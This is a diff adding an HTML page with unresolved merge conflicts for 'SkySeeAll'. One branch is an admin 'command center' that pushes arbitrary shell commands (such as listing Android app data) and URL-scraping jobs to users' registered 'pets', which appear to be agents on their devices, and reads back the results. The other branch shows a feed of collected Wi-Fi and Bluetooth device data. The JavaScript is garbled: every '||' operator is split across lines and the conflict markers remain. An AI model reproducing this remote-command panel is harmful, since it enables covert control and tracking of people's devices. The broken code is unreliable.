@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<<<<<<< HEAD
+    <title>SkySeeAll V6 Command Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+     .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+        /* V6: Add status colors */
+     .status-pending { color: #f59e0b; } /* amber-500 */
+     .status-sent { color: #3b82f6; } /* blue-500 */
+     .status-completed { color: #22c55e; } /* green-500 */
+     .status-failed { color: #ef4444; } /* red-500 */
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-100 font-sans p-4 md:p-8">
+    <div class="max-w-6xl mx-auto">
+        <header class="mb-8">
+            <h1 class="text-4xl font-bold text-blue-400">SkySeeAll V6</h1>
+            <p class="text-lg text-gray-400">Tiered Command Center</p>
+        </header>
+
+        <div class="mb-6 bg-gray-800 p-4 rounded-lg shadow-lg">
+            <label for="adminToken" class="block text-sm font-medium text-gray-300 mb-2">
+                Admin Token (Your 'ADMIN_TOKEN' from ~/.bashrc)
+            </label>
+            <input type="password" id="adminToken" class="bg-gray-700 text-white w-full p-2 rounded-md border border-gray-600" placeholder="Paste your secret admin token here">
+        </div>
+
+        <div class="flex flex-col lg:flex-row gap-6">
+            <div class="lg:w-1/2 flex flex-col gap-6">
+                <section class="bg-gray-800 p-4 rounded-lg shadow-lg">
+                    <h2 class="text-2xl font-semibold text-blue-300 mb-4">Tier 1: Admin Dashboard</h2>
+                    <button id="btnFetchUsers" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-md transition duration-200">
+                        Fetch All Users
+                    </button>
+                    <div id="userList" class="mt-4 space-y-2">
+                        </div>
+                </section>
+
+                <section class="bg-gray-800 p-4 rounded-lg shadow-lg">
+                    <h2 class="text-2xl font-semibold text-green-300 mb-4">Tier 2: User Registration (Public)</h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <input type="text" id="regUserId" placeholder="New User ID (e.g., user_skyseeall1988)" class="bg-gray-700 text-white p-2 rounded-md border border-gray-600">
+                        <input type="text" id="regUsername" placeholder="New Username (e.g., skyseeall1988)" class="bg-gray-700 text-white p-2 rounded-md border border-gray-600">
+                    </div>
+                    <button id="btnRegister" class="mt-4 bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-md transition duration-200">
+                        Register New User
+                    </button>
+                </section>
+            </div>
+
+            <div class="lg:w-1/2 flex flex-col gap-6">
+                <section id="commandCenter" class="bg-gray-800 p-4 rounded-lg shadow-lg hidden">
+                    <h2 class="text-2xl font-semibold text-yellow-300 mb-4">V6: Command Center</h2>
+                    <p class="text-sm text-gray-400 mb-2">
+                        Pushing commands to:
+                        <strong id="cmdTargetUser" class="text-white"></strong> /
+                        <strong id="cmdTargetPet" class="text-white"></strong>
+                    </p>
+                    <div class="space-y-2">
+                        <label class="font-medium">Run Shell Command</label>
+                        <input type="text" id="cmdShell" placeholder="e.g., ls -l /data/data" class="bg-gray-700 text-white w-full p-2 rounded-md border border-gray-600">
+                        <button id="btnPushShell" class="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded-md text-sm">
+                            Push 'run_shell'
+                        </button>
+                    </div>
+                    <div class="space-y-2 mt-4">
+                        <label class="font-medium">Scrape URL</label>
+                        <input type="text" id="cmdUrl" placeholder="e.g., https://www.google.com" class="bg-gray-700 text-white w-full p-2 rounded-md border border-gray-600">
+                        <button id="btnPushScrape" class="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-4 rounded-md text-sm">
+                            Push 'scrape_url'
+                        </button>
+                    </div>
+                </section>
+
+                <div class="bg-black p-4 rounded-lg shadow-inner">
+                    <h3 class="text-lg font-semibold text-gray-400 mb-2">API Output Console</h3>
+                    <pre id="apiOutput" class="bg-gray-900 text-sm h-96 overflow-y-auto whitespace-pre-wrap p-2 rounded-md border border-gray-700"></pre>
+                    <button id="btnClearOutput" class="mt-2 bg-gray-600 hover:bg-gray-700 text-white py-1 px-3 rounded-md text-xs">
+                        Clear Console
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- Element Selectors ---
+        const adminTokenInput = document.getElementById('adminToken');
+        const btnFetchUsers = document.getElementById('btnFetchUsers');
+        const userList = document.getElementById('userList');
+        const apiOutput = document.getElementById('apiOutput');
+        const btnClearOutput = document.getElementById('btnClearOutput');
+        const btnRegister = document.getElementById('btnRegister');
+        const regUserId = document.getElementById('regUserId');
+        const regUsername = document.getElementById('regUsername');
+        
+        // V6 Command Center Selectors
+        const commandCenter = document.getElementById('commandCenter');
+        const cmdTargetUser = document.getElementById('cmdTargetUser');
+        const cmdTargetPet = document.getElementById('cmdTargetPet');
+        const cmdShell = document.getElementById('cmdShell');
+        const btnPushShell = document.getElementById('btnPushShell');
+        const cmdUrl = document.getElementById('cmdUrl');
+        const btnPushScrape = document.getElementById('btnPushScrape');
+        
+        // --- Global State ---
+        let currentCommandTarget = { userId: null, petId: null };
+
+        // --- Utility Functions ---
+        function getAuthHeaders() {
+            const token = adminTokenInput.value;
+            if (!token) {
+                logToConsole("ERROR: Admin Token is missing. Please paste it in the input box.", true);
+                return null;
+            }
+            return {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+            };
+        }
+
+        function logToConsole(message, isError = false) {
+            if (typeof message === 'object') {
+                message = JSON.stringify(message, null, 2);
+            }
+            const prefix = isError? ' ' : '[INFO] ';
+            const colorClass = isError? 'text-red-400' : 'text-green-400';
+            apiOutput.innerHTML += `<span class="${colorClass}">${prefix}</span>${message}\n\n`;
+            apiOutput.scrollTop = apiOutput.scrollHeight;
+        }
+
+        function clearConsole() {
+            apiOutput.innerHTML = '';
+        }
+
+        // --- API Call Functions ---
+        /**
+         * Fetches all users from the admin endpoint.
+         */
+        async function fetchAllUsers() {
+            logToConsole("Fetching all users...");
+            const headers = getAuthHeaders();
+            if (!headers) return;
+
+            try {
+                const response = await fetch('/admin/users', {
+                    method: 'GET',
+                    headers: headers
+                });
+                const data = await response.json();
+                logToConsole(data,!response.ok);
+                if (response.ok) {
+                    displayUsers(data);
+                } else {
+                    userList.innerHTML = '<p class="text-red-400">Failed to fetch users.</p>';
+                }
+            } catch (error) {
+                logToConsole(error.message, true);
+                userList.innerHTML = '<p class="text-red-400">Network error.</p>';
+            }
+        }
+
+        /**
+         * Fetches detailed info for a single user.
+         */
+        async function fetchUserDetails(userId) {
+            logToConsole(`Fetching details for user: ${userId}`);
+            const headers = getAuthHeaders();
+            if (!headers) return;
+
+            const detailsDiv = document.getElementById(`details-${userId}`);
+            if (!detailsDiv) return;
+            
+            detailsDiv.innerHTML = '<div class="spinner mx-auto my-4"></div>';
+
+            try {
+                const response = await fetch(`/admin/user/${userId}`, {
+                    method: 'GET',
+                    headers: headers
+                });
+                const data = await response.json();
+
+                if (!response.ok) {
+                    logToConsole(data, true);
+                    detailsDiv.innerHTML = `<p class="text-red-400">Error: ${data.error}</p>`;
+                    return;
+                }
+                
+                // Log success but don't overwhelm console
+                logToConsole(`Successfully fetched details for ${userId}`);
+                
+                // V6: Render user details, pets, and commands
+                let detailsHtml = '<div class="mt-2 space-y-4">';
+
+                // Pets section
+                detailsHtml += `<h4 class="font-semibold text-blue-200">Pets (${data.pets.length}):</h4>`;
+                if (data.pets.length > 0) {
+                    detailsHtml += '<div class="space-y-2">';
+                    data.pets.forEach(pet => {
+                        detailsHtml += `
+                        <div class="bg-gray-800 p-2 rounded-md">
+                            <div class="flex justify-between items-center">
+                                <span class="font-medium">${pet.pet_name}</span>
+                                <button
+                                    onclick="showCommandCenter('${userId}', '${pet.pet_id}', '${pet.pet_name}')"
+                                    class="bg-yellow-500 hover:bg-yellow-600 text-white py-1 px-2 rounded-md text-xs">
+                                    Command
+                                </button>
+                            </div>
+                            <span class="text-xs text-gray-400 block">ID: ${pet.pet_id}</span>
+                            <pre class="text-xs bg-gray-900 p-2 rounded-md overflow-x-auto mt-1">${JSON.stringify(pet.pet_data, null, 2)}</pre>
+                        </div>`;
+                    });
+                    detailsHtml += '</div>';
+                } else {
+                    detailsHtml += '<p class="text-sm text-gray-400">No pets found.</p>';
+                }
+
+                // Commands section
+                detailsHtml += '<h4 class="font-semibold text-blue-200 mt-4">Command History (Last 50):</h4>';
+                if (data.commands.length > 0) {
+                    detailsHtml += '<div class="space-y-2">';
+                    data.commands.forEach(cmd => {
+                        const statusClass = `status-${cmd.status.toLowerCase()}`;
+                        const result = cmd.parameters.result? JSON.stringify(cmd.parameters.result) : 'N/A';
+                        detailsHtml += `
+                        <div class="bg-gray-800 p-2 rounded-md text-xs">
+                            <div class="flex justify-between">
+                                <span>${cmd.command_type} (ID: ${cmd.command_id})</span>
+                                <strong class="${statusClass} uppercase">${cmd.status}</strong>
+                            </div>
+                            <div class="text-gray-400">Pet: ${cmd.pet_id}</div>
+                            <div class="text-gray-400">Sent: ${new Date(cmd.created_at).toLocaleString()}</div>
+                            <button onclick="checkCommandStatus(${cmd.command_id})" class="text-blue-400 text-xs">(Check Status/Result)</button>
+                            <pre id="cmd-result-${cmd.command_id}" class="hidden bg-gray-900 p-1 mt-1 rounded overflow-x-auto"></pre>
+                        </div>`;
+                    });
+                    detailsHtml += '</div>';
+                } else {
+                    detailsHtml += '<p class="text-sm text-gray-400">No commands found.</p>';
+                }
+
+                detailsDiv.innerHTML = detailsHtml + '</div>';
+
+            } catch (error) {
+                logToConsole(error.message, true);
+                detailsDiv.innerHTML = '<p class="text-red-400">Network error.</p>';
+            }
+        }
+
+        /**
+         * Deletes a user.
+         */
+        async function deleteUser(userId) {
+            if (!confirm(`Are you sure you want to delete user ${userId}? This is permanent and will delete all their pets and commands.`)) {
+                return;
+            }
+
+            logToConsole(`Deleting user: ${userId}`);
+            const headers = getAuthHeaders();
+            if (!headers) return;
+
+            try {
+                const response = await fetch(`/admin/user/${userId}`, {
+                    method: 'DELETE',
+                    headers: headers
+                });
+                const data = await response.json();
+                logToConsole(data,!response.ok);
+                if (response.ok) {
+                    const userDiv = document.getElementById(`user-${userId}`);
+                    if (userDiv) userDiv.remove();
+                }
+            } catch (error) {
+                logToConsole(error.message, true);
+            }
+        }
+
+        /**
+         * Registers a new user.
+         */
+        async function registerUser() {
+            const userId = regUserId.value |
+
+| 'user_skyseeall1988';
+            const username = regUsername.value |
+
+| 'skyseeall1988';
+
+            if (!userId ||!username) {
+                logToConsole("User ID and Username are required for registration.", true);
+                return;
+            }
+
+            logToConsole(`Registering new user: ${username} (ID: ${userId})`);
+
+            try {
+                const response = await fetch('/api/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user_id: userId, username: username })
+                });
+                const data = await response.json();
+                logToConsole(data,!response.ok);
+                if (response.ok) {
+                    regUserId.value = '';
+                    regUsername.value = '';
+                }
+            } catch (error) {
+                logToConsole(error.message, true);
+            }
+        }
+
+        // --- V6: NEW COMMAND FUNCTIONS ---
+        /**
+         * [V6] Pushes a new command to the server.
+         */
+        async function pushNewCommand(commandType, parameters) {
+            const { userId, petId } = currentCommandTarget;
+            if (!userId ||!petId) {
+                logToConsole("No target selected. Click a 'Command' button on a pet first.", true);
+                return;
+            }
+
+            const headers = getAuthHeaders();
+            if (!headers) return;
+
+            const payload = {
+                user_id: userId,
+                pet_id: petId,
+                command_type: commandType,
+                parameters: parameters
+            };
+
+            logToConsole(`Pushing command: ${commandType} to ${petId}`);
+
+            try {
+                const response = await fetch('/admin/command/push', {
+                    method: 'POST',
+                    headers: headers,
+                    body: JSON.stringify(payload)
+                });
+                const data = await response.json();
+                logToConsole(data,!response.ok);
+                if (response.ok) {
+                    logToConsole(`Command ${data.command_id} pushed successfully. Status: ${data.status}`);
+                    // Optionally, refresh user details to show new command
+                    fetchUserDetails(userId);
+                }
+            } catch (error) {
+                logToConsole(error.message, true);
+            }
+        }
+
+        /**
+         * [V6] Checks the status and result of a single command.
+         */
+        async function checkCommandStatus(commandId) {
+            const headers = getAuthHeaders();
+            if (!headers) return;
+
+            const resultPre = document.getElementById(`cmd-result-${commandId}`);
+            if (!resultPre) return;
+
+            resultPre.classList.remove('hidden');
+            resultPre.innerHTML = '<div class="spinner"></div>';
+            logToConsole(`Checking status for command ${commandId}...`);
+
+            try {
+                const response = await fetch(`/admin/command/${commandId}`, {
+                    method: 'GET',
+                    headers: headers
+                });
+                const data = await response.json();
+                logToConsole(data,!response.ok);
+
+                if (response.ok) {
+                    const result = data.parameters.result;
+                    let resultHtml = `Status: <strong class="status-${data.status.toLowerCase()}">${data.status.toUpperCase()}</strong>\n`;
+                    if (result) {
+                        resultHtml += `\n--- OUTPUT ---\n${result.output |
+
+| '(No Output)'}`;
+                        resultHtml += `\n--- ERROR ---\n${result.error |
+
+| '(No Error)'}`;
+                    } else {
+                        resultHtml += "\n(No result payload yet)";
+                    }
+                    resultPre.textContent = resultHtml;
+                } else {
+                    resultPre.textContent = `Error: ${data.error}`;
+                }
+            } catch (error) {
+                logToConsole(error.message, true);
+                resultPre.textContent = "Network error.";
+            }
+        }
+
+        // --- UI Rendering ---
+        /**
+         * Renders the list of users from the admin endpoint.
+         */
+        function displayUsers(users) {
+            if (!users |
+
+| users.length === 0) {
+                userList.innerHTML = '<p class="text-gray-400">No users found.</p>';
+                return;
+            }
+            userList.innerHTML = users.map(user => `
+                <div id="user-${user.user_id}" class="bg-gray-700 p-3 rounded-md">
+                    <div class="flex flex-wrap justify-between items-center">
+                        <div>
+                            <strong class="text-white">${user.username}</strong>
+                            <span class="text-sm text-gray-400 block">ID: ${user.user_id}</span>
+                            <span class="text-sm text-gray-400 block">Pets: ${user.pet_count}</span>
+                        </div>
+                        <div class="flex space-x-2 mt-2 md:mt-0">
+                            <button onclick="fetchUserDetails('${user.user_id}')" class="bg-blue-500 hover:bg-blue-600 text-white py-1 px-3 rounded-md text-xs">
+                                View Details
+                            </button>
+                            <button onclick="deleteUser('${user.user_id}')" class="bg-red-600 hover:bg-red-700 text-white py-1 px-3 rounded-md text-xs">
+                                Delete User
+                            </button>
+                        </div>
+                    </div>
+                    <div id="details-${user.user_id}" class="mt-2 text-sm"></div>
+                </div>
+            `).join('');
+        }
+
+        /**
+         * [V6] Shows the Command Center, targeting a specific pet.
+         */
+        function showCommandCenter(userId, petId, petName) {
+            currentCommandTarget = { userId, petId };
+            cmdTargetUser.textContent = userId;
+            cmdTargetPet.textContent = `${petName} (${petId})`;
+            commandCenter.classList.remove('hidden');
+            // Scroll to the command center
+            commandCenter.scrollIntoView({ behavior: 'smooth' });
+            logToConsole(`Command Center is now targeting Pet: ${petName} (ID: ${petId})`);
+        }
+
+        // --- Event Listeners ---
+        btnFetchUsers.addEventListener('click', fetchAllUsers);
+        btnRegister.addEventListener('click', registerUser);
+        btnClearOutput.addEventListener('click', clearConsole);
+
+        // V6 Event Listeners
+        btnPushShell.addEventListener('click', () => {
+            const command = cmdShell.value;
+            if (command) {
+                pushNewCommand('run_shell', { command: command });
+                cmdShell.value = ''; // Clear input
+            } else {
+                logToConsole("Shell command cannot be empty.", true);
+            }
+        });
+
+        btnPushScrape.addEventListener('click', () => {
+            const url = cmdUrl.value;
+            if (url) {
+                pushNewCommand('scrape_url', { url: url });
+                cmdUrl.value = ''; // Clear input
+            } else {
+                logToConsole("URL cannot be empty.", true);
+            }
+        });
+    </script>
+</body>
+</html>
+=======
+    <title>SkySeeAll Dashboard</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 20px; }
+        .container { max-width: 800px; margin: auto; }
+        h1, h2 { text-align: center; color: #4a90e2; }
+        .tab-nav { display: flex; border-bottom: 1px solid #444; }
+        .tab-btn { padding: 10px 15px; cursor: pointer; background: none; border: none; color: #aaa; font-size: 1.1em; }
+        .tab-btn.active { color: #4a90e2; border-bottom: 2px solid #4a90e2; }
+        .tab-content { display: none; padding: 20px 0; }
+        .tab-content.active { display: block; }
+        #admin-login { text-align: center; padding: 40px 0; }
+        input[type="password"], input[type="text"] { width: 80%; padding: 10px; background-color: #333; border: 1px solid #555; color: #fff; border-radius: 5px; margin-bottom: 10px; }
+        button { background-color: #4a90e2; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 1em; }
+        button:hover { background-color: #357abd; }
+        #data-display { max-height: 600px; overflow-y: auto; background-color: #1e1e1e; border-radius: 5px; padding: 10px; }
+        pre { white-space: pre-wrap; word-wrap: break-word; font-family: "Courier New", Courier, monospace; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SkySeeAll Dashboard</h1>
+
+        <div class="tab-nav">
+            <button class="tab-btn active" onclick="showTab('dashboard')">Dashboard</button>
+            <button class="tab-btn" onclick="showTab('admin')">Admin</button>
+            <button class="tab-btn" onclick="showTab('legal')">Legal</button>
+        </div>
+
+        <!-- Dashboard Tab -->
+        <div id="dashboard" class="tab-content active">
+            <div id="admin-login">
+                <h2>Admin Access Required</h2>
+                <input type="password" id="adminTokenInput" placeholder="Enter Admin Token">
+                <button onclick="login()">Login</button>
+                <p id="login-status"></p>
+            </div>
+
+            <div id="data-view" style="display: none;">
+                <h2>Live Data Feed</h2>
+                <button onclick="fetchData()">Refresh Data</button>
+                <div id="data-display">
+                    <p>Click "Refresh Data" to load...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Admin Tools Tab -->
+        <div id="admin" class="tab-content">
+            <h2>Admin Tools</h2>
+            <p>You are logged in as an administrator.</p>
+            <button onclick="logout()">Logout</button>
+        </div>
+
+        <!-- Legal Tab -->
+        <div id="legal" class="tab-content">
+            <h2>Legal Disclaimer</h2>
+            <pre id="legal-text">Loading legal text...</pre>
+        </div>
+    </div>
+
+    <script>
+        let adminToken = localStorage.getItem('skyseall_token') || null;
+
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(tabName).classList.add('active');
+            document.querySelector(`.tab-btn[onclick="showTab('${tabName}')"]`).classList.add('active');
+            if (tabName === 'legal') loadLegal();
+        }
+
+        async function loadLegal() {
+            try {
+                const response = await fetch('/legal');
+                const text = await response.text();
+                document.getElementById('legal-text').textContent = text;
+            } catch (e) {
+                document.getElementById('legal-text').textContent = "Error loading disclaimer.";
+            }
+        }
+
+        async function login() {
+            const token = document.getElementById('adminTokenInput').value;
+            const statusEl = document.getElementById('login-status');
+
+            try {
+                const response = await fetch('/api/admin_login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: token })
+                });
+                const data = await response.json();
+
+                if (data.success) {
+                    statusEl.textContent = "Login successful!";
+                    adminToken = token;
+                    localStorage.setItem('skyseall_token', token);
+                    checkAuth();
+                } else {
+                    statusEl.textContent = "Error: " + data.message;
+                }
+            } catch (e) {
+                statusEl.textContent = "Network error.";
+            }
+        }
+
+        function logout() {
+            adminToken = null;
+            localStorage.removeItem('skyseall_token');
+            checkAuth();
+            showTab('dashboard');
+            alert('Logged out.');
+        }
+
+        async function fetchData() {
+            if (!adminToken) { alert('You must be logged in.'); return; }
+            const display = document.getElementById('data-display');
+            display.innerHTML = "<p>Fetching data...</p>";
+
+            try {
+                const response = await fetch('/api/get_data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: adminToken })
+                });
+
+                if(response.status === 401) { logout(); return; }
+                const data = await response.json();
+
+                if (data.error) {
+                     display.innerHTML = `<pre>Error: ${data.error}</pre>`;
+                     return;
+                }
+
+                let html = "<h3>Wi-Fi Signals (Last 20)</h3>";
+                html += `<pre>${JSON.stringify(data.wifi, null, 2)}</pre>`;
+                html += "<h3>Bluetooth Devices (Last 20)</h3>";
+                html += `<pre>${JSON.stringify(data.bluetooth, null, 2)}</pre>`;
+                display.innerHTML = html;
+
+            } catch (e) {
+                display.innerHTML = `<pre>Error: ${e.message}</pre>`;
+            }
+        }
+
+        function checkAuth() {
+            if (adminToken) {
+                document.getElementById('admin-login').style.display = 'none';
+                document.getElementById('data-view').style.display = 'block';
+                document.querySelector('.tab-btn[onclick="showTab(\'admin\')"]').style.display = 'block';
+            } else {
+                document.getElementById('admin-login').style.display = 'block';
+                document.getElementById('data-view').style.display = 'none';
+                document.querySelector('.tab-btn[onclick="showTab(\'admin\')"]').style.display = 'none';
+            }
+        }
+
+        // Run on page load
+        checkAuth();
+    </script>
+</body>
+</html>
+
+>>>>>>> refs/remotes/origin/main
